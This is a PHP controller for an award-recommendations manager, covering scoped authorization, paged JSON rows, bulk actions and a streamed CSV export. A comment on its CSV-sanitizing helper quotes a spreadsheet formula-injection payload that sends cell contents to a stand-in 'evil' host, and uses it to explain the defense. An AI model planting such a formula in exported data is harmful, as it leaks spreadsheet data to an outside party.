<?php

/**
 * Render a DB date as a human-readable one for the Recommendations Manager.
 *
 * Defined here rather than in a template because both include sites for
 * _rm_row.tpl (manage() and the rows() JSON batch) need it, and rows() never
 * loads Recommendations_manage.tpl. Empty and zero dates pass through as ''
 * so callers can keep using empty() checks.
 */
if (!function_exists('rmNiceDate')) {
    function rmNiceDate($date)
    {
        $date = trim((string)$date);
        if ($date === '' || strpos($date, '0000-00-00') === 0) {
            return '';
        }
        $ts = strtotime($date);
        return $ts === false ? $date : date('M j, Y', $ts);
    }
}

class Controller_Recommendations extends Controller
{
    // Per-request memoization for the two scope-wide maps every rendered row needs.
    private $rmCourtMapMemo = [];
    private $rmParkMapMemo  = [];

    public function __construct($call = null, $id = null)
    {
        parent::__construct($call, $id);
        $this->load_model('Court');
        // orkui/model is the only membrane to the lib; these back the location
        // lookups, officer preloads and per-recommendation writes below.
        $this->load_model('Kingdom');
        $this->load_model('Park');
        $this->load_model('Player');
    }

    // Route: ?Route=Recommendations/manage/kingdom/{kingdom_id}
    //        ?Route=Recommendations/manage/park/{park_id}
    public function manage($context = null, $id = null)
    {
        $this->template = '../revised-frontend/Recommendations_manage.tpl';

        // Parse route + resolve/authorize scope (shared with rows()).
        [$kingdom_id, $park_id, $context, $uid, $authStatus] = $this->resolveContext($context, $id);

        if ($authStatus === 'invalid') {
            $this->data['Error'] = 'Invalid location.';
            return;
        }
        if ($authStatus === 'forbidden') {
            $this->data['Error'] = 'You do not have permission to manage recommendations.';
            return;
        }

        // Location name (DB lives in the lib short-info getters).
        $locationName = '';
        if ($park_id > 0) {
            $pi = $this->Park->get_park_info($park_id);
            $locationName = $pi['ParkInfo']['ParkName'] ?? '';
        } else {
            $ki = $this->Kingdom->get_kingdom_info($kingdom_id);
            $locationName = $ki['KingdomInfo']['KingdomName'] ?? '';
        }

        // First 500-row batch for the scope (server-side filtered/sorted/paged).
        // Defaults mirror the recs-tab pills: eligibility 'open', sort by date desc.
        $this->load_model('Reports');
        $page = $this->Reports->recommended_awards_page([
            'RequestedBy' => $uid,
            'KingdomId'   => $park_id > 0 ? 0 : $kingdom_id,
            'ParkId'      => $park_id,
            'Eligibility' => 'open',
            'SortKey'     => 'date',
            'SortDir'     => 'desc',
            'Limit'       => 500,
            'Offset'      => 0,
        ]);
        $this->data['Groups']     = $page['Groups'];
        $this->data['Total']      = (int)$page['Total'];
        $this->data['HasMore']    = (bool)$page['HasMore'];
        $this->data['NextOffset'] = (int)$page['NextOffset'];

        // Court membership per rec (badges + court filter).
        $courtMap = $this->rmCourtMap($kingdom_id, $park_id);

        // Courts in scope (Add-to-Court existing-court picker + specific-court filter).
        // Include subordinate park courts: the Manager's badges and its court filter must
        // describe the SAME set of courts, so a kingdom officer sees a rec already staged
        // on a park court and is not able to double-book the honor.
        $courts = $this->Court->get_court_list($kingdom_id, $park_id, true);

        $this->data['CourtMap'] = $courtMap;
        $this->data['Courts']   = $courts;
        // Parks in the kingdom (kingdom-scope park filter + abbrev lookup); DB in lib.
        $this->data['Parks']    = $this->rmParkMap($kingdom_id);

        $this->data['KingdomId']    = $kingdom_id;
        $this->data['ParkId']       = $park_id;
        $this->data['Context']      = $context;
        $this->data['LocationName'] = $locationName;
        $this->data['Uid']          = $uid;
        // Granting officer's persona — the default "Given By" in the Grant Award modal.
        $me = $uid > 0 ? $this->Player->player_info($uid) : false;
        $this->data['UserName'] = is_array($me) ? ($me['Persona'] ?? '') : '';

        // Preloaded Monarch/Regent officers — quick-pick chips for "Given By" in the
        // Grant Award modal (park officers first, then kingdom officers).
        $token           = $this->session->token;
        $preloadOfficers = [];
        $addOfficers = function ($officers, $rolePrefix) use (&$preloadOfficers) {
            foreach ((array)($officers['Officers'] ?? []) as $o) {
                if (in_array($o['OfficerRole'] ?? '', ['Monarch', 'Regent'], true) && (int)($o['MundaneId'] ?? 0) > 0) {
                    $preloadOfficers[] = [
                        'MundaneId' => (int)$o['MundaneId'],
                        'Persona'   => $o['Persona'] ?? '',
                        'Role'      => $rolePrefix . $o['OfficerRole'],
                    ];
                }
            }
        };
        if ($park_id > 0) {
            // Model_Park::get_officers() returns the officer list (or false); the
            // closure reads the ['Officers'] shape the lib getter used to hand back.
            $parkOfficers = $this->Park->get_officers($park_id, $token);
            $addOfficers(['Officers' => is_array($parkOfficers) ? $parkOfficers : []], '');
        }
        $addOfficers($this->Kingdom->get_officers_bundle($kingdom_id, $token), $park_id > 0 ? 'Kingdom ' : '');
        $this->data['PreloadOfficers'] = $preloadOfficers;
    }

    // Route: ?Route=Recommendations/rows/kingdom/{id} or /rows/park/{id}  (GET: filters/sort/offset)
    // Returns one 500-row JSON batch of rendered <tr class="rm-row"> partials.
    public function rows($context = null, $id = null)
    {
        // Parse route + resolve/authorize scope (shared with manage()).
        [$kingdom_id, $park_id, $context, $uid, $authStatus] = $this->resolveContext($context, $id);

        header('Content-Type: application/json');
        // Rows carry per-viewer content (anonymous recommenders are unmasked only
        // for admins), so this must never sit in a shared or browser cache —
        // export() already sets the same header.
        header('Cache-Control: no-store');
        if ($authStatus !== null) {
            http_response_code(403);
            echo json_encode(['error' => 'forbidden']);
            exit;
        }

        $req = [
            'RequestedBy' => $uid,
            'KingdomId'   => $park_id > 0 ? 0 : $kingdom_id,
            'ParkId'      => $park_id,
            'Search'      => (string)($_GET['search'] ?? ''),
            'Eligibility' => (string)($_GET['elig'] ?? 'open'),
            'Court'       => (string)($_GET['court'] ?? 'all'),
            'Park'        => (string)($_GET['park'] ?? 'all'),
            'PassLocal'   => !empty($_GET['passlocal']),
            // Opt-in: fold dismissed (soft-deleted) recommendations into the list.
            'IncludeDismissed' => !empty($_GET['dismissed']),
            'SortKey'     => (string)($_GET['sort'] ?? 'date'),
            'SortDir'     => (string)($_GET['dir'] ?? 'desc'),
            'Limit'       => 500,
            'Offset'      => max(0, (int)($_GET['offset'] ?? 0)),
        ];

        // An offset-only scroll batch cannot change the grouped total: the filter
        // set is identical, only the window moved. When the client echoes back both
        // the fingerprint this endpoint handed it AND the total it is displaying,
        // hand that total to the lib as KnownTotal: the grouped COUNT (the same
        // correlated subqueries as the page query) is skipped and the known value is
        // echoed straight back. Deliberately KnownTotal and not SkipCount — SkipCount
        // returns Total as NULL, and `total: null` renders as the literal string
        // "null" in #rm-total. This way `total` is ALWAYS an int.
        $fp = $this->rmFilterFingerprint($req);
        $knownTotal = (string)($_GET['total'] ?? '');
        if ($req['Offset'] > 0 && $knownTotal !== '' && is_numeric($knownTotal) && (string)($_GET['fp'] ?? '') === $fp) {
            $req['KnownTotal'] = max(0, (int)$knownTotal);
        }

        $this->load_model('Reports');
        $page = $this->Reports->recommended_awards_page($req);

        // Memoized per request: both maps are scope-wide and unchanged between the
        // pages of one scroll, and export() now calls them once per streamed batch.
        $CourtMap = $this->rmCourtMap($kingdom_id, $park_id);
        $Parks    = $this->rmParkMap($kingdom_id);
        $Context  = $context;

        $html = '';
        foreach ($page['Groups'] as $group) {
            ob_start();
            include DIR_TEMPLATE . 'revised-frontend/_rm_row.tpl';
            $html .= ob_get_clean();
        }
        echo json_encode([
            'html'    => $html,
            // Always an int: either freshly counted, or the KnownTotal echoed back.
            'total'   => (int)($page['Total'] ?? 0),
            'hasMore' => (bool)$page['HasMore'],
            'offset'  => (int)$page['NextOffset'],
            'fp'      => $fp,
        ]);
        exit;
    }

    // Route: POST ?Route=Recommendations/bulk/kingdom/{id} or /bulk/park/{id}
    // POST: Action=dismiss|snooze|unsnooze|passlocal, Ids=comma-separated rec ids,
    // Passed=0|1 (passlocal only).
    //
    // One round trip for a whole bulk selection instead of one POST per rec. Each id
    // still goes through the SAME model call the per-row endpoints use, because the
    // lib enforces authority against the recommendation's OWN park/kingdom — tighter
    // than the route scope resolved here. Per-id outcomes are reported individually
    // so a partial failure is not shown to the officer as a total failure.
    public function bulk($context = null, $id = null)
    {
        [$kingdom_id, $park_id, $context, $uid, $authStatus] = $this->resolveContext($context, $id);

        header('Content-Type: application/json');
        header('Cache-Control: no-store');
        if ($authStatus !== null) {
            http_response_code(403);
            echo json_encode(['error' => 'forbidden']);
            exit;
        }

        // Ids/Action must be scalar: a stray Ids[]=/Action[]= would make PHP emit an
        // "Array to string conversion" warning INTO the already-started JSON body.
        $action = is_array($_POST['Action'] ?? null) ? '' : (string)($_POST['Action'] ?? '');
        if (!in_array($action, ['dismiss', 'snooze', 'unsnooze', 'passlocal', 'undelete'], true)) {
            echo json_encode(['status' => 1, 'ok' => 0, 'failed' => 0, 'results' => [], 'error' => 'Invalid action.']);
            exit;
        }
        $passed = !empty($_POST['Passed']) ? 1 : 0;
        $token  = $this->session->token;

        $ids = is_array($_POST['Ids'] ?? null) ? '' : (string)($_POST['Ids'] ?? '');
        $raw = array_filter(array_map('trim', explode(',', $ids)), 'strlen');
        // Sane batch cap. Anything past it is NOT silently dropped: the client reads a
        // missing id as a failed row, so truncation must report itself per id.
        $overflow = array_slice($raw, 1000);
        $raw      = array_slice($raw, 0, 1000);

        $results = [];
        $ok      = 0;
        $failed  = 0;
        foreach ($overflow as $rawId) {
            $results[] = ['id' => (int)$rawId, 'ok' => false, 'error' => 'Batch limit exceeded (1000).'];
            $failed++;
        }
        foreach ($raw as $rawId) {
            $rec_id = (int)$rawId;
            if (!valid_id($rec_id)) {
                // A bad id fails on its own; the rest of the batch still runs.
                $results[] = ['id' => $rec_id, 'ok' => false, 'error' => 'Invalid recommendation.'];
                $failed++;
                continue;
            }

            if ($action === 'dismiss') {
                $r = $this->Player->delete_player_recommendation([
                    'Token'             => $token,
                    'RecommendationsId' => $rec_id,
                    'RequestedBy'       => $uid,
                    'Granted'           => 0,
                ]);
            } elseif ($action === 'snooze') {
                // Same throne the per-row Snooze writes (KingdomAjax/ParkAjax): a park-scope
                // Manager snapshots that park's monarchy, a kingdom-scope one the Crown.
                // Without this the two Snooze buttons on the same page wrote different seats.
                $r = $this->Player->snooze_recommendation(array_merge([
                    'Token'             => $token,
                    'RecommendationsId' => $rec_id,
                ], $park_id > 0
                    ? ['ScopeParkId' => $park_id]
                    : ['ScopeKingdomId' => $kingdom_id, 'ScopeParkId' => 0]));
            } elseif ($action === 'unsnooze') {
                $r = $this->Player->unsnooze_recommendation([
                    'Token'             => $token,
                    'RecommendationsId' => $rec_id,
                ]);
            } elseif ($action === 'undelete') {
                // Restore clears deleted_at AND deleted_by, and cascades back only to
                // the seconds retired in the same operation. Authority is checked per
                // recommendation inside the lib, as with every other verb here.
                $r = $this->Player->restore_player_recommendation([
                    'Token'             => $token,
                    'RecommendationsId' => $rec_id,
                    'RequestedBy'       => $uid,
                ]);
            } else {
                $r = $this->Player->set_recommendation_passed_to_local([
                    'Token'             => $token,
                    'RecommendationsId' => $rec_id,
                    'Passed'            => $passed,
                    'RequestedBy'       => $uid,
                ]);
            }

            if (is_array($r) && (int)($r['Status'] ?? 1) === 0) {
                $results[] = ['id' => $rec_id, 'ok' => true, 'error' => null];
                $ok++;
            } else {
                $results[] = [
                    'id'    => $rec_id,
                    'ok'    => false,
                    'error' => (is_array($r) ? ($r['Error'] ?? 'Error') : 'Error')
                        . ': ' . (is_array($r) ? ($r['Detail'] ?? '') : ''),
                ];
                $failed++;
            }
        }

        echo json_encode([
            'status'  => 0,
            'ok'      => $ok,
            'failed'  => $failed,
            'results' => $results,
        ]);
        exit;
    }

    /**
     * Neutralize spreadsheet formula injection in a CSV cell.
     *
     * Recommendation reasons and personas are written by ordinary players, not
     * officers. Excel / Sheets / LibreOffice treat a cell starting with = + - @
     * (or a leading tab / CR, which they strip before re-testing) as a FORMULA,
     * so `=HYPERLINK("http://evil/?"&A1,"x")` in a reason would execute in the
     * officer's spreadsheet when they open the export. fputcsv() only handles CSV
     * quoting, which does not stop this. Prefixing a single quote makes the cell
     * inert text; it is the standard mitigation and is invisible in every major
     * spreadsheet app.
     */
    private function csvSafe($v)
    {
        $v = (string)$v;
        if ($v !== '' && strpbrk(substr($v, 0, 1), "=+-@\t\r") !== false) {
            return "'" . $v;
        }
        return $v;
    }

    // Route: ?Route=Recommendations/export/kingdom/{id} or /export/park/{id}  (GET: same filters as rows)
    // Streams the FULL current filtered/sorted set as a CSV download, fetched and
    // flushed in 500-row batches rather than materialized in one pass.
    public function export($context = null, $id = null)
    {
        [$kingdom_id, $park_id, $context, $uid, $authStatus] = $this->resolveContext($context, $id);
        if ($authStatus !== null) {
            http_response_code(403);
            header('Content-Type: text/plain; charset=utf-8');
            echo 'Not authorized.';
            exit;
        }

        // Streamed in the same 500-row batches the Manager scrolls in, rather than
        // materializing the whole filtered set in PHP first: memory stays bounded and
        // rows reach the browser continuously, so a slow query or a proxy read timeout
        // can no longer produce a silently truncated (or zero-byte) CSV.
        $req = [
            'RequestedBy' => $uid,
            'KingdomId'   => $park_id > 0 ? 0 : $kingdom_id,
            'ParkId'      => $park_id,
            'Search'      => (string)($_GET['search'] ?? ''),
            'Eligibility' => (string)($_GET['elig'] ?? 'open'),
            'Court'       => (string)($_GET['court'] ?? 'all'),
            'Park'        => (string)($_GET['park'] ?? 'all'),
            'PassLocal'   => !empty($_GET['passlocal']),
            // Opt-in: fold dismissed (soft-deleted) recommendations into the list.
            'IncludeDismissed' => !empty($_GET['dismissed']),
            'SortKey'     => (string)($_GET['sort'] ?? 'date'),
            'SortDir'     => (string)($_GET['dir'] ?? 'desc'),
            'Limit'       => 500,
            'Offset'      => 0,
            // Export never reads Total — it pages until HasMore goes false. Without
            // this every one of the N batches re-runs the grouped COUNT over the same
            // correlated subqueries (40 counts on a 20k-row export instead of 0).
            'SkipCount'   => true,
        ];

        $this->load_model('Reports');
        $courtMap = $this->rmCourtMap($kingdom_id, $park_id);
        $parks    = $this->rmParkMap($kingdom_id);

        $scope = $park_id > 0 ? 'park-' . $park_id : 'kingdom-' . $kingdom_id;
        $fname = 'recommendations-' . $scope . '-' . date('Y-m-d') . '.csv';

        header('Content-Type: text/csv; charset=utf-8');
        header('Content-Disposition: attachment; filename="' . $fname . '"');
        header('Cache-Control: no-store');

        // Discard any stray output (PHP notices, logtrace, etc.) and drop the buffers
        // so each flushed batch actually leaves the process. DISCARD, not flush: the
        // BOM is written below, so flushing buffered notices would put them AHEAD of
        // it and break the file for Excel. The @ob_end_clean() in the condition also
        // terminates the loop on an unremovable buffer (zlib.output_compression)
        // instead of spinning on it forever.
        while (ob_get_level() > 0 && @ob_end_clean()) {
        }

        $out = fopen('php://output', 'w');
        fwrite($out, "\xEF\xBB\xBF"); // UTF-8 BOM so Excel reads accented personas correctly
        fputcsv($out, [
            'Recipient', 'Park', 'Award', 'Rank', 'Recommended By', 'Date', 'Age (days)',
            'Support', 'Already Has', 'Retired', 'Snoozed', 'Passed To Local', 'On Court', 'Reason',
        ]);

        // Headers, BOM and the header row are already on the wire, so a failure
        // mid-stream cannot be reported as an HTTP error — the browser would save a
        // short file that looks complete. Every abnormal exit therefore writes a
        // terminal sentinel row as the last line of the CSV.
        $batches = 0;
        $more    = false;
        try {
            do {
                // Each batch gets its own slice of wall clock; the export as a whole is
                // bounded by the batch cap below, not by one giant query.
                @set_time_limit(60);
                $page   = $this->Reports->recommended_awards_page($req);
                $groups = is_array($page['Groups'] ?? null) ? $page['Groups'] : [];
                $this->exportBatch($out, $groups, $parks, $courtMap);
                fflush($out);
                flush();

                $next = (int)($page['NextOffset'] ?? 0);
                $more = !empty($page['HasMore']) && $next > $req['Offset'];
                $req['Offset'] = $next;
            } while ($more && ++$batches < 2000);
        } catch (\Throwable $e) {
            error_log('Recommendations::export failed at offset ' . (int)$req['Offset'] . ': ' . $e->getMessage());
            fputcsv($out, ['ERROR — export incomplete: the download stopped after ' . (int)$req['Offset'] . ' rows. Re-run the export.']);
            fclose($out);
            exit;
        }
        if ($more) {
            // Batch cap reached with rows still pending — also a truncated file.
            fputcsv($out, ['ERROR — export incomplete: hit the batch limit after ' . (int)$req['Offset'] . ' rows. Narrow the filters and re-run.']);
        }

        fclose($out);
        exit;
    }

    // One streamed CSV batch. Split out of export() only so the paging loop above
    // stays readable — the row shaping is unchanged.
    private function exportBatch($out, array $groups, array $parks, array $courtMap)
    {
        foreach ($groups as $g) {
            $rank      = (int)($g['Rank'] ?? 0);
            $rankLabel = $rank > 0 ? (string)$rank : 'non-ladder';
            $parkName  = $parks[(int)($g['ParkId'] ?? 0)]['Name'] ?? '';

            // Recommenders across the cluster (unique, anonymous shown as "Anonymous").
            $names = [];
            foreach (($g['Members'] ?? []) as $m) {
                $n = $m['RecommendedByName'] ?? null;
                if ($n === null || $n === '') {
                    if (!empty($m['IsAnonymous'])) {
                        $n = 'Anonymous';
                    } else {
                        continue;
                    }
                }
                $names[$n] = true;
            }

            // Court plan names this cluster's recs sit on (if any).
            $courtNames = [];
            foreach (($g['MemberRecIds'] ?? []) as $rid) {
                foreach (($courtMap[$rid] ?? []) as $c) {
                    if (!empty($c['Name'])) {
                        $courtNames[$c['Name']] = true;
                    }
                }
            }

            // Every free-text cell here originates with a player (persona, reason,
            // recommender names) or an officer (award/park/court names), so all of
            // them go through csvSafe(); the numeric and Yes/No cells cannot carry a
            // formula trigger.
            fputcsv($out, [
                $this->csvSafe($g['Persona'] ?? ''),
                $this->csvSafe($parkName),
                $this->csvSafe($g['AwardName'] ?? ''),
                $this->csvSafe($rankLabel),
                $this->csvSafe(implode('; ', array_keys($names))),
                $g['OldestDate'] ?? '',
                (int)($g['OldestAgeDays'] ?? 0),
                (int)($g['SupportCount'] ?? 0),
                !empty($g['AlreadyHas']) ? 'Yes' : 'No',
                // Retired/deceased recipients rejoin the pending list looking identical
                // to active ones; the flag is computed upstream, so surface it here too.
                !empty($g['IsRetired']) ? 'Yes' : 'No',
                !empty($g['IsSnoozed']) ? 'Yes' : 'No',
                !empty($g['PassedToLocal']) ? 'Yes' : 'No',
                $this->csvSafe(implode('; ', array_keys($courtNames))),
                $this->csvSafe($g['Members'][0]['Reason'] ?? ''),
            ]);
        }
    }

    // Parse the route (`kingdom/6` joined segment) + resolve the scope ids, then
    // run the valid_id/canManage guard once. Shared by manage() and rows() so the
    // auth check can't diverge. Returns [kingdom_id, park_id, context, uid, status]
    // where $status is null (ok), 'invalid' (bad location) or 'forbidden' (no perm).
    private function resolveContext($context, $id)
    {
        // When route has 4+ segments (e.g. manage/kingdom/6), index.php joins
        // segments 2+ into a single string ('kingdom/6') passed as $context.
        if ($id === null && $context !== null && strpos($context, '/') !== false) {
            $parts   = explode('/', $context, 2);
            $context = $parts[0];
            $id      = $parts[1] ?? '';
        }
        $id      = (int)preg_replace('/[^0-9]/', '', $id ?? '');
        $context = ($context === 'park') ? 'park' : 'kingdom';
        $uid     = isset($this->session->user_id) ? (int)$this->session->user_id : 0;

        $kingdom_id = 0;
        $park_id    = 0;
        if ($context === 'park') {
            $park_id    = $id;
            // get_park_info() (GetParkShortInfo) already carries KingdomId, so the
            // parent lookup needs no second membrane method.
            $pi         = $this->Park->get_park_info($park_id);
            $kingdom_id = (int)($pi['ParkInfo']['KingdomId'] ?? 0);
        } else {
            $kingdom_id = $id;
        }

        $status = null;
        if (!valid_id($kingdom_id)) {
            $status = 'invalid';
        } elseif (!$this->Court->can_manage($uid, $kingdom_id, $park_id)) {
            $status = 'forbidden';
        }
        return [$kingdom_id, $park_id, $context, $uid, $status];
    }

    // Court-membership map for the scope. DB lives in the lib
    // (Court::getRecommendationCourtMap); this is a thin scope-typed accessor.
    private function rmCourtMap($kingdom_id, $park_id)
    {
        // Park courts included, matching the court list above — badges and filter must
        // cover the whole tree in scope or the Manager reports a mismatched court set.
        $key = (int)$kingdom_id . ':' . (int)$park_id;
        if (!array_key_exists($key, $this->rmCourtMapMemo)) {
            $this->rmCourtMapMemo[$key] = $this->Court->get_recommendation_court_map($kingdom_id, $park_id, true);
        }
        return $this->rmCourtMapMemo[$key];
    }

    // Park map for the kingdom-scope filter + row abbrev. DB lives in the lib
    // (Kingdom::GetParks); this only reshapes the result into pid => Name/Abbrev.
    private function rmParkMap($kingdom_id)
    {
        if (array_key_exists((int)$kingdom_id, $this->rmParkMapMemo)) {
            return $this->rmParkMapMemo[(int)$kingdom_id];
        }
        $map = [];
        $res = $this->Kingdom->get_parks((int)$kingdom_id);
        $rows = (isset($res['Parks']) && is_array($res['Parks'])) ? $res['Parks'] : [];
        foreach ($rows as $p) {
            $pid = (int)($p['ParkId'] ?? $p['park_id'] ?? 0);
            if ($pid) {
                $map[$pid] = [
                    'Name'   => $p['Name'] ?? $p['name'] ?? '',
                    'Abbrev' => $p['Abbreviation'] ?? $p['abbreviation'] ?? $p['Abbrev'] ?? '',
                ];
            }
        }
        $this->rmParkMapMemo[(int)$kingdom_id] = $map;
        return $map;
    }

    // Identity of the filter set behind a rows() request — everything except the
    // Limit/Offset window. The client echoes it back on scroll batches so rows()
    // can tell an offset-only page from a filter change.
    private function rmFilterFingerprint(array $req)
    {
        unset($req['Limit'], $req['Offset']);
        ksort($req);
        return md5(json_encode($req));
    }
}
